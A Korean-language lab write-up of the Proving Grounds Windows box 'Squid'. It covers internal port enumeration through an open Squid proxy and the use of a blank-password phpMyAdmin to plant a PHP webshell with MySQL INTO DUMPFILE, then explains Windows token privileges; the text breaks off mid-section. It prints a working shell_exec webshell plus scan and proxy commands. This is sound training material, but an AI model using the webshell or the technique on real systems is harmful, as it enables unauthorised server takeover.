---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/db/mysql
  - tech/win/seimpersonate
  - tech/win/potato
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.248.189
ports: [135, 139, 445, 3128]
services: [http-proxy, microsoft-ds, msrpc, netbios-ssn]
status: solved
manual_tags: true
tech_count: 4
---
> [!info] PG Practice — Pentester Foundations #6 · **첫 Windows 박스**
> **타겟** 192.168.248.189 · **OS** Windows Server 2019 Standard (build 17763, 호스트명 `SQUID`) · **난이도** Fundamental · **플래그 2개**
> **경로 요약** 3128 Squid **오픈 프록시**로 내부 포트 열거 → 8080 phpMyAdmin(root 무비번) → `INTO DUMPFILE` 웹셸 → `LOCAL SERVICE` → **FullPowers**로 SeImpersonate 복원 → **PrintSpoofer** → SYSTEM

## 0. 이 박스에서 배우는 것

- **오픈 프록시는 공격면이 아니라 통로다** — 외부 nmap이 보여주는 것은 이 박스의 절반도 안 된다. 프록시가 방화벽 뒤의 포트를 대신 열어준다
- **프록시 응답 코드로 내부 포트를 판별하는 법** — `503`/`403`/그 외의 의미를 손으로 구분한다. 도구가 오판할 때 이 기준만이 구해준다
- **MySQL 파일 쓰기 원시(primitive)로 웹셸 심기** — `@@secure_file_priv` 확인 → `INTO DUMPFILE` → hex 리터럴
- **Windows 토큰·특권 모델** — `SeImpersonatePrivilege`가 왜 SYSTEM으로 가는 열쇠이고, Potato 계열이 **명명 파이프 임퍼소네이션**으로 어떻게 동작하는가
- **`LOCAL SERVICE`의 특권은 "없는" 게 아니라 "박탈된" 것** — FullPowers로 되찾는다. **이 개념을 모르면 PrintSpoofer 단계까지 도달조차 못 한다**
- **Windows 전용 실전 요령** — `certutil` 다운로드, `powershell -enc`, 파일명 기반 탐지 회피, TTY 업그레이드가 해당 없다는 사실

> [!tip] 시험 출제 가능성
> **부분적으로 높다.** 셋으로 나눠서 보자.
>
> | 요소 | 시험 출제 가능성 | 이유 |
> |---|---|---|
> | **오픈 프록시 피벗** | 낮음~중간 | Squid 자체는 흔하지 않지만, **"외부에서 보이는 포트가 전부가 아니다"** 라는 사고방식은 SSH 포트포워딩·chisel·프록시체인 전 영역에 그대로 적용된다. 시험의 피벗 구간이 정확히 이 사고를 요구한다 |
> | **DB 자격증명 → 웹루트 파일 쓰기 → 웹셸** | **매우 높음** | phpMyAdmin/adminer 무비번은 시험 단골이다. `INTO OUTFILE`/`INTO DUMPFILE`은 [[Hawat]]에서도 그대로 나왔다 |
> | **`SeImpersonatePrivilege` → Potato → SYSTEM** | **매우 높음** | Windows 서비스 계정(`LOCAL SERVICE`·`NETWORK SERVICE`·`IIS APPPOOL\*`·`mssql`)으로 셸을 잡는 순간 이게 정석 경로다. **Windows 박스를 만나면 `whoami /priv`가 첫 명령**이다 |
>
> 변형은 이런 모습이다 — MySQL 대신 MSSQL(`xp_cmdshell`), phpMyAdmin 대신 Tomcat manager, Squid 대신 내부망 점프호스트. **원리는 동일하다.**

> [!abstract] 이 박스가 특별한 이유
> Pentester Foundations 컬렉션에서 **유일한 Windows 박스**다. 앞의 [[Crane]]·[[Hub]]·[[Levram]]·[[RubyDome]]·[[Astronaut]]이 전부 Linux였다.
> 그래서 리눅스 반사신경(`sudo -l`, `find / -perm -4000`, `python3 -c 'import pty'`)이 **전부 무용지물**이 되는 첫 지점이기도 하다. 이 노트의 절반은 그 대체 반사신경을 만드는 데 쓴다.

---

## 1. 정찰

### 1-1. Nmap — 외부에서 보이는 것

```bash
┌──(kali㉿kali)-[~/PG/Squid]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.189
Nmap scan report for 192.168.248.189
Host is up (0.094s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Running (JUST GUESSING): Microsoft Windows 2019 (92%)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | 기본 1000포트 스캔이면 3128은 잡히지만 **고번호 RPC 포트(49666/49667)를 놓친다**. 다른 박스에서는 이게 웹 포트일 수 있다 |
| `-sCV` | 기본 NSE 스크립트 + 버전 탐지 | `squid/4.14`라는 **정확한 버전**과 `http-server-header`가 안 나온다. 여기서는 이 한 줄이 "오픈 프록시일 수 있다"는 판단의 출발점이다 |
| `-Pn` | ping 사전 탐지 생략 | Windows 방화벽은 기본적으로 ICMP를 막는다. **`-Pn`을 빼면 "호스트 다운"으로 오판하고 스캔 자체를 안 한다.** Windows 타겟에서 가장 흔한 초보 실수 |
| `-A` | OS 추측 + traceroute + 스크립트 | `Microsoft Windows 2019 (92%)`가 안 나온다. 뒤에서 phpSysInfo가 준 `Windows Server 2019 Standard`와 **교차 검증**하는 데 쓴다 |
| `--min-rate 5000` | 초당 최소 패킷 | 65535 포트 전수가 수십 분 → 1~2분. **24시간 시험에서 이 한 줄이 시간을 만든다** |
| `-oN nmap.log` | 사람이 읽는 포맷으로 저장 | 재실행 없이 다시 볼 수 있다. 시험에서는 리포트 증거로도 쓴다 |

**웹 포트가 3128 하나뿐이다.** 80도 443도 없다. 나머지 65529개는 `filtered`(무응답) — 방화벽이 막고 있다.

> [!note] `filtered` · `closed` · `open`의 차이를 정확히 읽어라
> - `open` — SYN/ACK가 왔다. 서비스가 있다
> - `closed` — RST가 왔다. **호스트는 살아 있고 그 포트에 서비스가 없다** (방화벽이 없다는 뜻이기도 하다 → [[Hawat]]에서 `443/tcp closed`가 아웃바운드 힌트였다)
> - `filtered` — **아무 응답도 없다.** 방화벽이 패킷을 버렸다. **"서비스가 없다"가 아니라 "볼 수 없다"** 이다
>
> 여기서 65529개가 전부 `filtered`라는 것은 **"뒤에 뭔가 잔뜩 있는데 방화벽이 가리고 있다"** 는 강한 신호다. 아무것도 없는 호스트는 이렇게 생기지 않는다.

> [!warning] 여기서 "공격면이 없다"고 결론내면 박스가 끝난다
> 보이는 것은 SMB/RPC와 **프록시** 하나. 그런데 **프록시는 그 자체가 공격면이 아니라 통로**다.
> Squid가 인증 없이 열려 있으면(오픈 프록시) **방화벽 뒤의 포트를 프록시가 대신 열어준다.** 외부 스캔 결과는 이 박스의 절반도 보여주지 않는다.

### 1-2. 프록시 경유 내부 포트 열거 — 이 박스의 전부

Squid는 `http://127.0.0.1:<포트>/` 요청을 그대로 중계한다. **응답 코드로 내부 포트의 개폐를 판별**할 수 있다:

| 응답 | 의미 |
|---|---|
| `503` + `X-Squid-Error: ERR_CONNECT_FAIL` | 내부 포트 **닫힘** (프록시가 연결 실패) |
| `403` + `ERR_ACCESS_DENIED` | Squid **Safe_ports ACL이 차단** — 개폐 판별 불가 |
| 그 외 (200/400/404/405…) | 내부 포트 **열림** |

```bash
┌──(kali㉿kali)-[~/PG/Squid]
└─$ for p in 8080 3306 5985 47001 9999 3307; do
      R=$(curl -s -o /dev/null -m 8 -w '%{http_code}' -x http://192.168.248.189:3128 http://127.0.0.1:$p/)
      echo "port $p -> HTTP $R"
    done
port 8080  -> HTTP 200     ← 열림
port 3306  -> HTTP 200     ← 열림
port 5985  -> HTTP 404     ← 열림
port 47001 -> HTTP 404     ← 열림
port 9999  -> HTTP 503     ← 닫힘
port 3307  -> HTTP 503     ← 닫힘
```

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-x http://TARGET:3128` | curl에게 **이 요청을 프록시로 보내라**고 지시. URL(`http://127.0.0.1:8080/`)은 **프록시가 대신 접속할 목적지**가 된다 | 없으면 칼리 자신의 127.0.0.1에 접속한다. **이 한 글자가 이 박스의 전부다** |
| `-s` | 진행률 표시 억제 | `-w` 출력에 진행률이 섞여 파싱이 깨진다 |
| `-o /dev/null` | 본문 버림 | 본문이 터미널을 덮는다. 여기서 필요한 것은 **코드뿐** |
| `-m 8` | 8초 타임아웃 | **필수다.** 필터링된 포트는 응답이 영영 안 오고, 루프가 통째로 멈춘다 |
| `-w '%{http_code}'` | 상태 코드만 출력 | 판별 기준 자체가 사라진다 |

> [!danger] 왜 `127.0.0.1`인가 — 프록시 열거의 핵심
> 프록시에게 `http://192.168.248.189:3306/`(타겟의 외부 IP)을 요청해도 되지만, **`127.0.0.1`을 쓰면 타겟 자신의 루프백에서 출발**한다.
> 서비스가 `0.0.0.0`이 아니라 **루프백에만 바인드**돼 있으면(MySQL·WinRM 기본 구성에서 흔하다) 외부 IP로는 안 붙고 `127.0.0.1`로만 붙는다.
> **프록시를 만나면 항상 `127.0.0.1`로 먼저 쏜다.** `localhost`도 함께 시도한다 — hosts 파일 구성에 따라 결과가 다를 수 있다.

전 포트를 병렬로 돌려 얻은 결과:

| 내부 포트 | 서비스 | 외부 노출 |
|---|---|---|
| **3128** | Squid 자신 (`400 ERR_INVALID_URL`) | ✅ |
| **3306** | **MySQL 5.7.31** | ❌ |
| **5985** | **WinRM** (`Microsoft-HTTPAPI/2.0`) | ❌ |
| **8080** | **Apache 2.4.46 (Win64) / WampServer** | ❌ |
| **47001** | WinRM HTTP listener | ❌ |

> [!tip] 자동화 도구
> `spose.py` (https://github.com/aancw/spose) 가 이 작업을 해준다:
> ```bash
> python3 spose.py --proxy http://192.168.248.189:3128 --target 192.168.248.189
> ```
> 다만 **판별 기준을 직접 이해하고 있어야** 도구가 놓치거나 오판할 때 수동으로 확인할 수 있다. 위의 `503 vs 200` 대비가 그 기준이다.
> **이 박스에서 실제로 쓴 것은 위의 `for` 루프**다 — 도구 없이도 30초면 끝난다.

MySQL 배너도 프록시를 통해 그대로 샌다 (HTTP/0.9로 감싸져 나온다):

```
X-Transformed-From: HTTP/0.9
Via: 1.1 SQUID (squid/4.14)

J^@^@^@
5.7.31^@^M^@^@^@Q!^_^KH7^SZ ... mysql_native_password ... Got packets out of order
```

**MySQL 5.7.31**, 인증 플러그인 `mysql_native_password`.

> [!note] HTTP가 아닌 서비스에 HTTP를 던지면 왜 배너가 나오는가
> MySQL은 접속 즉시 **서버가 먼저** 핸드셰이크 패킷(버전 문자열 포함)을 보낸다. 우리가 보낸 `GET / HTTP/1.1`은 MySQL 프로토콜로는 쓰레기라 `Got packets out of order` 에러로 끝나지만, **그 전에 이미 배너를 받았다.**
> Squid는 응답 첫 줄이 `HTTP/x.x`가 아니면 **HTTP/0.9 본문**으로 간주해 그대로 전달한다(`X-Transformed-From: HTTP/0.9`). 그래서 **HTTP 프록시만으로 비-HTTP 서비스의 배너를 딸 수 있다.**
> 프록시 피벗에서 이 트릭은 매우 자주 쓰인다 — SMTP·FTP·Redis 배너도 같은 방식으로 샌다.

> [!warning] 프록시 열거의 한계 — 정직하게 기록할 것
> Squid의 `Safe_ports` ACL(21,70,80,210,280,443,488,591,777 및 1025-65535) **밖의 1024 미만 포트는 전부 403**이라 개폐를 판별할 수 없다.
> `CONNECT` 메서드도 전부 차단됐고(SSL_ports가 443만 허용), cache manager(`/squid-internal-mgr/info`)도 403이라 설정 덤프도 불가능하다.
> **"스캔했는데 안 나왔다"와 "스캔할 수 없었다"는 다르다.** 보고서에는 후자를 명시해야 한다.

### 1-3. 내부 서비스 식별 (전부 프록시 경유)

```bash
┌──(kali㉿kali)-[~/PG/Squid]
└─$ curl -s -I -x http://192.168.248.189:3128 http://127.0.0.1:8080/ | grep -iE 'Server|X-Powered'
Server: Apache/2.4.46 (Win64) PHP/7.3.21
X-Powered-By: PHP/7.3.21
```

`-I`는 **HEAD 요청**이다. 본문을 받지 않으므로 프록시 경유의 느린 왕복에서 특히 유리하다.

WampServer 홈페이지가 **구성 전체를 렌더한다**:

```
Version 3.2.3 - 64bit
Apache Version: 2.4.46          PHP Version: 7.3.21
MySQL Version: 5.7.31 - Port defined for MySQL: 3306 - default DBMS
MariaDB Version: 10.4.13 - Port defined for MariaDB: 3307
Your Aliases: adminer  phpmyadmin  phpsysinfo
```

MariaDB 3307은 정의만 돼 있고 실제로는 `503`(미기동)이다 — **설정에 적혀 있다고 떠 있는 게 아니다.**

버전 확정 (런타임 렌더 값 우선):

```bash
┌──(kali㉿kali)-[~/PG/Squid]
└─$ curl -s -x http://192.168.248.189:3128 http://127.0.0.1:8080/phpmyadmin/ | grep -oE 'PMA_VERSION:"[0-9.]+"'
PMA_VERSION:"5.0.2"

┌──(kali㉿kali)-[~/PG/Squid]
└─$ curl -s -x http://192.168.248.189:3128 http://127.0.0.1:8080/adminer/ | grep -oE 'version=[0-9.]+'
version=4.7.7
```

| 앱 | 버전 | 교차 근거 |
|---|---|---|
| **phpMyAdmin** | **5.0.2** | 인라인 JS `PMA_VERSION` + 자산 캐시버스터 `?v=5.0.2` (런타임) / `doc/html/index.html` `<title>` / `RELEASE-DATE-5.0.2` |
| **Adminer** | **4.7.7** | CSS·JS 두 자산의 `version=` 파라미터 (런타임) |
| phpSysInfo | 3.3.2 | `<Generation version="3.3.2">` |

> [!tip] 버전 판정은 독립 근거 2개 (누적 패턴: [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]])
> `RELEASE-DATE-*`·`CHANGELOG` 같은 **정적 파일은 업그레이드 시 남아 있을 수 있다.** 실제로 도는 버전은 **런타임이 렌더한 값**(`PMA_VERSION`, 자산 캐시버스터)이 우선이다.
> 둘이 어긋나면 런타임을 믿고, 어긋났다는 사실 자체를 기록한다.

### 1-4. phpSysInfo — 인증 없이 호스트 정보 대량 유출

`xml.php?plugin=complete` 가 인증 없이 응답한다:

```xml
<Vitals Hostname="SQUID" IPAddr="127.0.0.1" Kernel="10.0.17763 (64-bit)"
        Distro="Microsoft Windows Server 2019 Standard" Uptime="2904550" Processes="62" OS="WINNT"/>
<NetDevice Name="vmxnet3 Ethernet Adapter" Info="Ethernet0 2;00-50-56-AB-78-FF;192.168.248.189;10Gb/s"/>
<Hardware Name="VMware, Inc. VMware7,1"><CpuCore Model="AMD EPYC 7413 24-Core Processor"/>
<Mount FSType="NTFS" Name="Local Disk" Total="31566327808" MountPoint="C:"/>
```

호스트명 `SQUID`, **Windows Server 2019 Standard build 17763**, MAC, VMware 게스트, C: 30GB NTFS. nmap의 OS 추측(92% Windows Server 2019)과 교차 일치한다.

> [!note] build 17763이 왜 중요한가 — 권한상승 경로를 여기서 이미 좁힌다
> Windows 10 1809 / Server 2019 = **build 17763**. 이 빌드부터 **JuicyPotato가 죽었다**(DCOM 활성화 시 포트 135 고정 변경).
> 즉 이 숫자를 본 순간 "SeImpersonate를 잡으면 **PrintSpoofer 또는 RoguePotato**를 쓴다"가 확정된다. 2장 2-6에서 자세히 다룬다.
> **버전 문자열은 익스플로잇 검색용이 아니라 경로 선택용이다.**

`?phpinfo=1` 은 **설치 경로**를 준다:

```
System   Windows NT SQUID 10.0 build 17763 AMD64
Loaded Configuration File   C:\wamp\bin\apache\apache2.4.46\bin\php.ini
```

→ **wamp 경로 `C:\wamp\`**, 웹루트는 `C:\wamp\www\`. `INTO DUMPFILE`로 웹셸을 떨어뜨릴 때 이 경로가 필요하다.

### 1-5. 결정적 단서 — `/testmysql.php`

wamp 기본 스크립트가 **인증 없이 MySQL 접속에 성공**하고 있다:

```
Connection OK 127.0.0.1 via TCP/IP
Server 5.7.31
Initial charset: latin1
```

wamp 기본값은 **`root` / 빈 패스워드**다. 이 한 줄이 phpMyAdmin 로그인 자격증명을 사실상 확정해준다.

> [!tip] 남이 만들어둔 진단 스크립트를 찾아라
> `testmysql.php`·`info.php`·`phpinfo.php`·`test.php`·`db_test.php` 같은 **개발자 편의 스크립트**는 인증 없이 내부 연결 정보를 확인해주는 경우가 많다.
> 여기서는 "DB에 무비번으로 붙는다"는 사실을 **로그인 시도 한 번 없이** 알아냈다.

### 1-6. 디렉터리 열거

외부 웹 포트가 없어서 **8080을 프록시 경유로** 열거했다. 프록시를 거치면 매우 느려서 대규모 워드리스트는 부적합하다(300초 제한에 걸려 미완주 — **부분 커버리지**).

```bash
┌──(kali㉿kali)-[~/PG/Squid]
└─$ gobuster dir -u http://127.0.0.1:8080/ --proxy http://192.168.248.189:3128 \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak
/index.php    (Status: 200) [Size: 6448]
/Index.php    (Status: 200) [Size: 6448]     ← 대소문자 무시 = Windows 파일시스템
/INDEX.php    (Status: 200) [Size: 6448]
/phpmyadmin   (Status: 301)
/favicon.ico  (Status: 200)
```

| 플래그 | 역할 |
|---|---|
| `-u http://127.0.0.1:8080/` | **타겟은 루프백**이다. 프록시가 대신 접속하므로 우리 쪽 127.0.0.1이 아니다 |
| `--proxy http://192.168.248.189:3128` | 모든 요청을 Squid로 흘린다. 이게 없으면 자기 자신을 스캔한다 |
| `-x php,txt,html,bak` | 확장자 조합. WampServer이므로 `php`는 필수, `bak`은 백업본 노림수 |

타겟형 프로브가 훨씬 효율적이었다 — `/adminer`, `/phpsysinfo`, `/wampthemes`, `/testmysql.php` 전부 적중. **WampServer 홈페이지가 이미 alias 목록(`adminer phpmyadmin phpsysinfo`)을 알려줬기 때문**이다.

> [!note] 같은 파일이 대소문자만 바꿔 여러 번 나오면 Windows다
> `/index.php`·`/Index.php`·`/INDEX.php`가 전부 200 = **대소문자 구분 없는 파일시스템**. OS 판별의 부수 신호다.
> 역으로, gobuster 결과에 **대소문자 변형이 잔뜩 끼어 있으면 결과 수를 부풀려 읽지 마라.** 실제 엔드포인트는 하나다.

---

## 2. 취약점 분석

> [!abstract] 이 박스에는 CVE가 없다
> Squid 4.14도, phpMyAdmin 5.0.2도, MySQL 5.7.31도 **익스플로잇 대상이 아니다.** 전부 **오설정(misconfiguration)** 과 **Windows 특권 모델의 기본 동작**을 조합해 뚫린다.
> 그래서 이 장이 이 노트의 본체다 — 외울 페이로드가 아니라 **이해할 메커니즘**만 남는다.

### 2-1. 배경 지식 ① — 포워드 프록시와 오픈 프록시

**포워드 프록시**는 클라이언트를 대신해 목적지에 접속해주는 중계 서버다. 일반 HTTP 요청과 프록시 요청은 **요청 라인 자체가 다르다**:

```
일반 요청:   GET /path HTTP/1.1
             Host: example.com

프록시 요청: GET http://example.com/path HTTP/1.1     ← 절대 URI
             Host: example.com
```

프록시는 절대 URI를 보고 **자기가 그 목적지에 새로 TCP 연결을 연다.** 이 순간 **출발지 IP가 프록시의 IP로 바뀐다.**

> [!danger] 이게 왜 방화벽을 무력화하는가
> 방화벽 규칙은 보통 **"외부 → 내부 3306 차단"** 이다. 그런데 프록시가 여는 연결은 **내부 → 내부(127.0.0.1 → 127.0.0.1)** 다.
> 방화벽이 볼 때 이건 로컬 트래픽이라 규칙이 적용되지 않는다. **프록시가 방화벽의 안쪽에 서서 문을 열어주는 구조**다.
> 그래서 오픈 프록시 하나면 "외부 노출 포트 1개"가 "내부 전 포트 접근"으로 뒤집힌다.

**오픈 프록시**란 인증 없이, 출발지 제한 없이 아무나 쓸 수 있는 포워드 프록시다. Squid의 접근 제어는 `squid.conf`의 `http_access` 지시자로 이뤄지는데, 다음처럼 되면 오픈 프록시다:

```
http_access allow all           ← 이 한 줄이 원인
# 정상 구성이라면:
# acl localnet src 10.0.0.0/8
# http_access allow localnet
# http_access deny all
```

Squid에는 그 외에 두 개의 안전장치가 더 있고, **이 박스에서는 그것들만 살아 있었다**:

| ACL | 기본 동작 | 이 박스에서 관측된 결과 |
|---|---|---|
| `Safe_ports` | 21,70,80,210,280,443,488,591,777 및 **1025-65535**만 허용 | 1024 미만 포트(예: 445, 135)는 **403 ERR_ACCESS_DENIED** → 개폐 판별 불가 |
| `SSL_ports` | 443만 허용 | `CONNECT` 메서드 전부 차단 → **TLS 터널링·임의 TCP 터널 불가** |
| cache manager | `localhost`만 허용 | `/squid-internal-mgr/info` 403 → 설정 덤프 불가 |

> [!warning] `CONNECT`가 막혔다는 것의 실질적 의미
> `CONNECT`가 열려 있었다면 Squid는 **범용 TCP 터널**이 된다 — `proxychains`로 nmap을 통째로 밀어 넣고, `evil-winrm`을 5985에 직접 붙이고, MySQL 클라이언트로 3306에 붙을 수 있었다.
> 막혀 있으니 **평문 HTTP GET만 통과**한다. 그래서 이 박스의 모든 공격이 **"HTTP로 표현 가능한 것"** 으로 제한된다 — 이게 phpMyAdmin(HTTP)을 경유해 MySQL을 때린 이유이고, WinRM(5985가 열려 있는데도)을 못 쓴 이유다.
> **프록시를 만나면 `CONNECT` 가능 여부를 먼저 확인하라.** 되면 게임이 훨씬 쉬워진다:
> ```bash
> curl -v -x http://TARGET:3128 https://example.com/          # CONNECT 시도
> ```

### 2-2. 왜 응답 코드로 포트 개폐를 알 수 있는가

판별 기준은 **Squid가 어느 단계에서 실패했는가**를 읽는 것이다:

| 단계 | 프록시 동작 | 실패 시 응답 |
|---|---|---|
| ① ACL 검사 | 요청 포트가 `Safe_ports`인가 | **403 ERR_ACCESS_DENIED** |
| ② TCP 연결 | `connect(127.0.0.1, port)` | **503 ERR_CONNECT_FAIL** (RST 수신 = 포트 닫힘) |
| ③ HTTP 파싱 | 응답을 HTTP로 해석 | 실패해도 HTTP/0.9로 통과시킴 |

즉 **① 을 통과하고 ② 에서 실패하면 503, ② 를 통과하면 무엇이든 그대로 돌아온다.**

```
503 → 포트 닫힘        (연결 자체가 실패)
403 → 판별 불가        (ACL이 시도조차 막음)
그 외 → 포트 열림      (연결 성공 = 뭐라도 응답했다)
```

> [!danger] 이 기준을 손으로 이해하고 있어야 하는 이유
> 자동화 도구는 **"403을 닫힘으로 집계"** 하거나 **"타임아웃을 닫힘으로 집계"** 하는 실수를 흔히 한다.
> - 403은 **닫힘이 아니라 모름**이다. 여기에 서비스가 있을 수도 있다
> - 타임아웃은 **필터링**이지 닫힘이 아니다
>
> 도구 결과를 그대로 보고서에 쓰면 "스캔 결과 445는 닫혀 있었다"는 **틀린 문장**이 된다. 실제로는 445가 외부에 열려 있다(nmap이 봤다).
> **응답 헤더 `X-Squid-Error`를 직접 확인하는 습관**을 들여라:
> ```bash
> curl -s -D - -o /dev/null -x http://192.168.248.189:3128 http://127.0.0.1:9999/ | grep -i squid-error
> ```

### 2-3. 배경 지식 ② — MySQL 파일 쓰기 원시(primitive)

DB 접근이 곧 RCE가 되는 것은 아니다. **DB에서 파일 쓰기로, 파일 쓰기에서 코드 실행으로** 두 번 승격해야 한다.

MySQL에서 파일을 쓰려면 **세 조건**이 전부 성립해야 한다:

| 조건 | 확인 방법 | 이 박스 |
|---|---|---|
| DB 계정에 `FILE` 권한 | `SHOW GRANTS;` 또는 실제 시도 | `root`이므로 있음 |
| `@@secure_file_priv`가 쓰기를 허용 | `SELECT @@secure_file_priv;` | **빈 문자열 = 무제한** |
| 대상 디렉터리에 **mysqld 프로세스 계정**의 쓰기 권한 | 실제 시도 | `C:\wamp\www\` 쓰기 성공 |

그리고 **파일 쓰기 → 코드 실행**을 잇는 것은 별개 조건이다:

| 조건 | 이 박스 |
|---|---|
| 쓴 파일이 **웹서버가 서빙하는 경로** 안에 있어야 함 | `C:\wamp\www\` = 8080의 DocumentRoot |
| 그 파일이 **인터프리터로 실행**되어야 함 | `.php` 확장자 + Apache의 PHP 핸들러 |
| 그 경로에 **우리가 접근 가능**해야 함 | 프록시 경유로 `http://127.0.0.1:8080/sh.php` |

> [!note] `@@secure_file_priv` 세 가지 값의 의미
> | 값 | 의미 |
> |---|---|
> | `NULL` | **파일 입출력 전면 차단.** `INTO OUTFILE`·`INTO DUMPFILE`·`LOAD_FILE()` 전부 죽는다 |
> | `/some/dir/` | **그 디렉터리 안에서만** 읽기/쓰기 가능. 웹루트가 아니면 RCE로 못 잇는다 |
> | **빈 문자열** | **제한 없음.** 아무 경로나 쓸 수 있다 ← 이 박스 |
>
> MySQL 5.7부터 기본값이 `NULL`에 가깝게 강화됐지만, **WampServer/XAMPP 같은 올인원 패키지는 편의를 위해 빈 문자열로 두는 경우가 흔하다.**
> 단, [[Hawat]]에서는 **`NULL`인데도 쓰기가 됐다.** 변수값은 참고이고 **실측(마커 파일 쓰기)이 최종 근거**다.

### 2-4. 왜 취약한가 — 오설정 4중 중첩

이 박스는 단일 결함이 아니라 **네 개의 오설정이 사슬로 연결**돼 뚫린다. 하나만 고쳤어도 체인이 끊긴다:

| # | 오설정 | 없었다면 |
|---|---|---|
| 1 | Squid `http_access allow all` | 내부 포트에 아예 도달 불가 → 박스 종료 |
| 2 | MySQL `root` **빈 패스워드** | phpMyAdmin 로그인 실패 |
| 3 | `@@secure_file_priv` **빈 문자열** | 파일 쓰기 차단 |
| 4 | mysqld가 **웹루트에 쓰기 가능** | 웹셸을 서빙 경로에 못 놓음 |

> [!tip] 체인으로 보는 습관
> "취약점 하나 찾기"가 아니라 **"내가 가진 원시(primitive)를 무엇으로 승격할 수 있는가"** 로 사고한다.
> 여기서는 `HTTP 중계` → `DB 인증` → `임의 파일 쓰기` → `코드 실행` → `토큰 특권 복원` → `SYSTEM` 으로 **여섯 번 승격**했다.
> 각 단계에서 "지금 내가 가진 능력이 정확히 무엇인가"를 한 문장으로 말할 수 있어야 다음 수가 보인다.

### 2-5. 왜 이 페이로드인가 — hex 리터럴과 `DUMPFILE`

심을 웹셸 원문:

```php
<?php echo "PWN:"; if(isset($_REQUEST['c'])){ echo shell_exec($_REQUEST['c']); } ?>
```

이걸 그대로 SQL 문자열에 넣으면 **인용 계층이 3중으로 중첩**된다:

```
파이썬 문자열  →  HTTP POST 본문(urlencode)  →  PHP(phpMyAdmin)  →  MySQL 파서
```

원문에 `"`·`'`·`$`·`<`·`>`가 전부 들어 있어 어느 계층에서든 깨진다. **MySQL은 `0x...` 형태의 hex 문자열 리터럴을 그대로 받아주므로 인용 문제가 통째로 사라진다.**

```bash
echo -n '<?php echo "PWN:"; ... ?>' | xxd -p | tr -d '\n'
```

**페이로드 조각 해설**

| 조각 | 역할 |
|---|---|
| `SELECT 0x3c3f7068...` | hex 리터럴 = 웹셸 바이트열 그대로. `[a-f0-9]`만 남으므로 **모든 인용 계층을 무사통과** |
| `...0a` (끝) | 개행(`\n`). 파일 끝을 정리한다 |
| `INTO DUMPFILE` | 단일 행을 **가공 없이** 파일로 기록 |
| `'C:/wamp/www/sh.php'` | **슬래시** 경로. 백슬래시는 SQL 문자열 이스케이프(`\w`)와 충돌한다 |

> [!danger] `INTO OUTFILE` vs `INTO DUMPFILE` — 이 구분은 필수다
> | | `INTO OUTFILE` | `INTO DUMPFILE` |
> |---|---|---|
> | 대상 | 여러 행 | **단일 행만** |
> | 가공 | 열 구분자(`\t`)·행 구분자(`\n`) 삽입, 특수문자 이스케이프(`\\`, `\0`) | **없음. 바이트 그대로** |
> | 용도 | 텍스트 덤프 | **바이너리·정확한 바이트열** |
>
> `OUTFILE`로 웹셸을 쓰면 백슬래시가 `\\`로 부풀고 개행이 끼어들어 **PHP 문법이 깨질 수 있다.** 특히 `.exe`·`.dll` 같은 바이너리는 100% 망가진다.
> [[Hawat]]에서는 `UNION ... INTO OUTFILE`을 썼는데 **앞에 원 쿼리 결과가 붙었다** — PHP는 태그 밖을 텍스트로 뱉을 뿐이라 우연히 동작했다. **의도적으로 하려면 `DUMPFILE`이 맞다.**

> [!warning] 두 구문 모두 **기존 파일을 덮어쓰지 않는다**
> 대상 파일이 이미 존재하면 `Errcode: 17 - File exists`로 실패한다. 같은 이름으로 재시도하며 헤매지 말고 **파일명을 바꿔라.**
> 이것 때문에 "권한 문제"로 오진하고 시간을 태우는 경우가 많다.

### 2-6. 배경 지식 ③ — Windows 접근 토큰과 특권 모델

여기서부터가 **Linux 반사신경이 통하지 않는 구간**이다. 개념부터 세운다.

**접근 토큰(access token)** 은 프로세스가 들고 다니는 신분증이다. 안에 들어 있는 것:

| 구성 요소 | 리눅스 대응 | 설명 |
|---|---|---|
| 사용자 SID | uid | `NT AUTHORITY\LOCAL SERVICE` 등 |
| 그룹 SID 목록 | gid/groups | `BUILTIN\Users`, `NT AUTHORITY\SERVICE` … |
| **특권(privileges) 목록** | **대응 없음** | 각 항목이 **Enabled/Disabled** 상태를 가짐 |
| 무결성 수준 | 대응 없음 | Low / Medium / High / System |

> [!note] 리눅스에 없는 개념 — "특권"은 uid와 독립이다
> 리눅스는 "root냐 아니냐"가 거의 전부다(capabilities가 있지만 예외적). Windows는 **비관리자 계정이 관리자급 특권을 하나만 들고 있을 수 있다.**
> 그래서 Windows 권한상승의 첫 질문은 **"내가 누구냐"가 아니라 "내 토큰에 무엇이 켜져 있느냐"** 다.
> ```
> whoami /priv          ← Windows 셸을 잡으면 이게 1번 명령이다
> whoami /all           ← 그룹 SID까지
> ```

**SYSTEM으로 가는 열쇠가 되는 특권들** (전부 사실상 관리자 동급):

| 특권 | 무엇을 할 수 있는가 |
|---|---|
| **`SeImpersonatePrivilege`** | **다른 클라이언트의 토큰을 흉내낼 수 있다** ← 이 박스 |
| `SeAssignPrimaryTokenPrivilege` | 임의 토큰으로 프로세스를 새로 만들 수 있다 |
| `SeDebugPrivilege` | 임의 프로세스 메모리 접근 → SYSTEM 프로세스에서 토큰 훔치기 |
| `SeBackupPrivilege` | 임의 파일 읽기 → SAM/SYSTEM 하이브 덤프 |
| `SeRestorePrivilege` | 임의 파일 쓰기 |
| `SeTakeOwnershipPrivilege` | 임의 객체 소유권 획득 |
| `SeLoadDriverPrivilege` | 커널 드라이버 로드 |

### 2-7. 배경 지식 ④ — `SeImpersonatePrivilege`와 Potato 계열의 원리

